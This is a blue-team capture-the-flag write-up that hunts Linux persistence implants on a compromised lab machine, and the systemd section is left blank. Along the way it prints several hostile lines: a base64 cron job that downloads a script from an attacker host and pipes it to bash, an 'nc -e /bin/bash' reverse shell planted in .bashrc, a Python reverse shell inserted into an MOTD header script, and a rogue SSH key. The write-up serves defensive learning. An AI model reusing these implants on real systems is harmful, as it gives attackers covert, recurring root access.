<h1 align="center">Challenge 062 - Hide and Seek </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/3efe3842-4146-4b91-8c21-0ef6da84f374" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️ </p>

As I'm working with a SOC team right now, I think it might help to get some basic blue teaming knowledge into my head. This challenge focuses on conducting a live system analysis to uncover post-compromise activity related to persistence mechanisms.

A note was discovered on the compromised system, taunting us. It suggests multiple persistence mechanisms have been implanted, ensuring that Cipher can return whenever he pleases. Here's the note.

```
ubuntu@tryhackme:~$ cat for_specter.txt
Dear Specter,

I must say, it?s been a thrill dancing through your systems. You lock the doors, I pick the locks. You set up alarms, I waltz right past them. But today, my dear adversary, I?ve left you a little game.

I've sprinkled a few persistence implants across your system, like digital Easter eggs, and I?m giving you a sporting chance to find them. Each one has a clue, because where?s the fun in a silent hack?

- Time is on my side, always running like clockwork.
- A secret handshake gets me in every time.?
- Whenever you set the stage, I make my entrance.?
- I run with the big dogs, booting up alongside the system.?
- I love welcome messages.

Find them all, and you might just earn a little respect. Miss one, and well? let's just say I?ll be back before you even realize I never left.

Happy hunting, Phantom. May the best ghost win.

- Cipher
```

To start with I settled on tackling every hint separately.

## Time is on my side, always running like clockwork.
This is a big pointer to cron jobs, which allow attackers to maintain persistence by executing commands on a schedule. There may have been a suspicious script dropped in some cron directory. After unsuccessfully checking cron directories like cron.hourly, cron.weekly and cron.monthly I pivoted to checking user crontabs. By using *sudo crontab -l* we were able to get a list of root's cron jobs.

```
ubuntu@tryhackme:~$ sudo crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
```

Persistence mechanism spotted. The entry in question that is interesting for us is

```
* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
```

The stars give us an idea of the schedule. Here they mean, that every minute, of every hour, of every day, forever the rest of the entry gets executed. Here a base64-encoded string gets decoded and executed with Bash. Errors get suppressed *(2>/dev/null)*.

Decoding the string gives us the following output.

<img width="628" height="529" alt="image" src="https://github.com/user-attachments/assets/ead5b56e-7c67-4515-ae78-24062ec5d5d8" />

Basically every minute, the system connects to a remote attacker-controlled server, downloads a script *a.sh* and executes it as root. An easy way for persistent access and automatic re-infection. Even if we kill the reverse shell, it would come back within 60 seconds. That's why he said, that time would be on his side. Decoding the hex value inside the decoded base64-encoding reveals the first part of the message to us.

<img width="1409" height="422" alt="image" src="https://github.com/user-attachments/assets/e696cdfc-b900-4cd6-b663-734d2b39cd67" />



## A secret handshake gets me in every time.
This hint screams authentication bypass via credentials that don't expire. We need to do a cryptographic exchange that proves our validity. On Linux that would easily be possible through SSH key-based access. They get us in every time, as they don't expire by default, survive password resets, are often ignored for years and still work even if MFA is added. With this gained knowledge I looked through all users in the hopes of finding some keys and indeed quickly found an interesting directory called *.ssh*

```
ubuntu@tryhackme:/home$ sudo ls -la /home/zeroday
total 28
drwxr-x--- 3 zeroday zeroday 4096 Mar 13  2025 .
drwxr-xr-x 8 root    root    4096 Mar  7  2025 ..
-rw------- 1 zeroday zeroday   27 Mar 13  2025 .bash_history
-rw-r--r-- 1 zeroday zeroday  220 Mar  7  2025 .bash_logout
-rw-r--r-- 1 zeroday zeroday 3771 Mar  7  2025 .bashrc
-rw-r--r-- 1 zeroday zeroday  807 Mar  7  2025 .profile
drwxrwxr-x 2 zeroday zeroday 4096 Mar  7  2025 .ssh
```

In it we find a public key labelled .authorized keys. So the SSH key persistance is pretty much confirmed. When cat'ing it we see the following output

```
ubuntu@tryhackme:/home$ sudo cat /home/zeroday/.ssh/.authorized_keys
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGigCKLtSqMcOfttFdDnNXfwKd5nH8Ws3hFNRmBDWxfvuaaC6h9zWishJVfr0xsyV0SSkMGPCuPLRU41ckvnGbA= 326e6420706172743a20755f6730745f.local
```

Something seems unusual with this authorized_keys file. The key type and base64-key itself are common practice and what's to be expected. It only starts getting weird, when we are looking at the comment part. This section should be human-readable, yet here it looks like it's hex encoded. When decoding it, we get the second part of our flag

<img width="1406" height="403" alt="Bildschirmfoto vom 2026-02-02 22-58-57" src="https://github.com/user-attachments/assets/724f1aec-0ef1-4a76-b764-f547180bdf88" />


## Whenever you set the stage, I make my entrance.
This is a strong clue for login/session initialization. Whenever a user (us) - so Specter - logs in and the environment is "set". Logically it would make sense to look up a file that is executed every time an interactive Bash shell starts. The .bashrc is one of those file, that runs on every login. 

```
ubuntu@tryhackme:/home$ sudo cat /home/specter/.bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells. 
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) 
# for examples 

# If not running interactively, don't do anything 
case $- in 
    *i*) ;; 
      *) return;; 
esac 

# don't put duplicate lines or lines starting with space in the history. 
# See bash(1) for more options 
HISTCONTROL=ignoreboth 

# append to the history file, don't overwrite it 
shopt -s histappend 

nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
...
```

While just looking at that snippet of code one specific line stands out immediately

```
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

This looks like a classic reverse-shell. With netcat, hostname, port (443) and remote server all integrated. 2>/dev/null ensures that error output is suppressed, making all activity quiet and stealthy. So every time we - the user - start a shell, the system automatically connects back to Cipher and gives him a live Bash shell. A smart persistence mechanism. We receive some hex string once again, which when decoded spits out some base64 encoding.

<img width="1406" height="403" alt="image" src="https://github.com/user-attachments/assets/ad4ed163-e33d-4d78-b8d0-6f791cb259bc" />

When decoding the base64 encoding, we get the third part of our message.

<img width="628" height="529" alt="image" src="https://github.com/user-attachments/assets/652e3c9e-edbd-4d60-9640-610d8bb2abb8" />

## I run with the big dogs, booting up alongside the system.
This could very well refer to system/root-level processes and start during system boot. It survives reboots and runs before any user logs in. So we're talking about init / service mechanisms. Most Linux distros use systemd for that, so the primary directory to check out is */etc/systemd/system/*



## I love welcome messages.
In Linux this could be a hint for login banners. When logging into a Linux system (locally or via SSH), we can sometimes see text like

```
Welcome to Ubuntu 22.04 LTS
```

That text comes from specific files that are displayed automatically on login. They are loved by attackers as they are executed or displayed every login and almost nobody really inspects those. Checking out the */etc/update-motd.d* is vital as it contains scripts that generate the MOTD dynamically. It's a prime persistance location. Anything executable there runs at login, as root, every time. By just checking out the directory we can already see suspicious activity.

```
ubuntu@tryhackme:~$ sudo ls -la /etc/update-motd.d
total 68
drwxr-xr-x   2 root root  4096 Mar  7  2025 .
drwxr-xr-x 172 root root 12288 Feb  3 00:46 ..
-rwxr-xr-x   1 root root  1499 Mar  7  2025 00-header
-rwxr-xr-x   1 root root  1151 Jan  2  2024 10-help-text
lrwxrwxrwx   1 root root    46 Sep  1  2024 50-landscape-sysinfo -> /usr/share/landscape/landscape-sysinfo.wrapper
-rwxr-xr-x   1 root root  5023 Aug 17  2020 50-motd-news
-rwxr-xr-x   1 root root    84 May 11  2023 85-fwupd
-rwxr-xr-x   1 root root   218 Apr  2  2020 90-updates-available
-rwxr-xr-x   1 root root   296 Jun 17  2024 91-contract-ua-esm-status
-rwxr-xr-x   1 root root   558 Jan  9  2023 91-release-upgrade
-rwxr-xr-x   1 root root   165 Jul 21  2020 92-unattended-upgrades
-rwxr-xr-x   1 root root   379 Feb 22  2024 95-hwe-eol
-rwxr-xr-x   1 root root   111 Feb 25  2020 97-overlayroot
-rwxr-xr-x   1 root root   142 Apr  2  2020 98-fsck-at-reboot
-rwxr-xr-x   1 root root   144 Apr  2  2020 98-reboot-required
```

*00-header* sticks out as it seems to have been modified very recently. Let's cat the header file.

```
ubuntu@tryhackme:~$ sudo cat /etc/update-motd.d/00-header 
#!/bin/sh 
#
# 00-header - create the header of the MOTD 
# Copyright (C) 2009-2010 Canonical Ltd. 
# 
# Authors: Dustin Kirkland <kirkland@canonical.com> 
#
# This program is free software; you can redistribute it and/or modify 
# it under the terms of the GNU General Public License as published by 
# the Free Software Foundation; either version 2 of the License, or 
# (at your option) any later version. 
#
# This program is distributed in the hope that it will be useful, 
# but WITHOUT ANY WARRANTY; without even the implied warranty of 
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the 
# GNU General Public License for more details. 
# 
# You should have received a copy of the GNU General Public License along 
# with this program; if not, write to the Free Software Foundation, Inc., 
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release 
if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then 
    # Fall back to using the very slow lsb_release utility 
    DISTRIB_DESCRIPTION=$(lsb_release -s -d) 
fi 

python3 -c 'import socket,subprocess,os; 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",
)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); 
p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null 

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" 
"$(uname -o)" "$(uname -r)" "$(uname -m)"
```

As we can see the header script has been modified to include a Python reverse shell that connects to a remote attacker-controlled server and spawn an interactive root shell every time a user logs in.

```
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null
```

This provides stealthy, reliable persistence. We take the last hex encoded string from the malicious code and decode to get the final part of our message.

<img width="1409" height="422" alt="image" src="https://github.com/user-attachments/assets/ef658d39-51e1-44aa-a2de-620d4e9b2879" />
